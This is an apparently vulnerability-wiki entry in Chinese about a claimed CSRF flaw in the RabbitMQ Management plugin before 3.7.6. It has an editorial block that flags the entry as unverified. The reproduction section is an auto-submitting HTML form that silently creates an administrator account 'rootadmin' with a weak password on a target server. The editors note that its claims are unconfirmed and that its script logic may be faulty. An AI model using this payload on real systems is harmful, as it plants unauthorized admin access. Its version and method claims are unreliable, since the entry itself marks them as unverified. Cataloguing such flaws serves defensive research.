---
source: "hatch 补库批 20260928"
title: "RabbitMQ Web管理csrf漏洞"
product: "RabbitMQ Management插件"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
prerequisites: "受害管理员浏览器已携带可跨站发送的有效凭据，旧版API接受给定POST form编码；正文未说明"
source_status: "unknown"
side_effects: "原文未完整记录副作用、清理步骤或运行验证；阅读样例不等于获准在真实系统执行。"
id: "vw-3d4566021a5c186f699fb158"
entity_id: "ve-3d4566021a5c186f699fb158"
schema_version: "1"
---

# RabbitMQ Web管理csrf漏洞

<!-- vulwiki-editorial:start -->
## 校订与适用边界

- 适用前提：受害管理员浏览器已携带可跨站发送的有效凭据，旧版API接受给定POST form编码；正文未说明
- 证据范围：只有HTML自动提交表单，无版本实际响应，不能确认/api/users/rootadmin接受POST表单而非通常PUT JSON接口。

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- 缺身份凭据跨站发送、HTTP方法/Content-Type接受条件的源码或实测
- window.onload = rabbit.submit()是立即调用后赋值而非注册load回调，且全局rabbit依赖浏览器named-element行为
- 无来源/CVE/修复版本依据，简介空白
- 若成功会创建管理员而非只读检查，缺清理说明

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

一、漏洞简介
------------

二、漏洞影响
------------

RabbitMQ Web Management \< 3.7.6

三、复现过程
------------

    <html> 
    <h2>Add RabbitMQ Admin</h2>
    <body>
    <form name="rabbit" id="rabbit" action="https://www.0-sec.org/api/users/rootadmin" method="POST">
    <input type="hidden" name="username" value="rootadmin" />
    <input type="hidden" name="password" value="rootadmin" />
    <input type="hidden" name="tags" value="administrator" />
    <input type="submit"  value="save" />
    </form>
    <script>
      window.onload = rabbit.submit()
    </script>
    </body>
    </html>
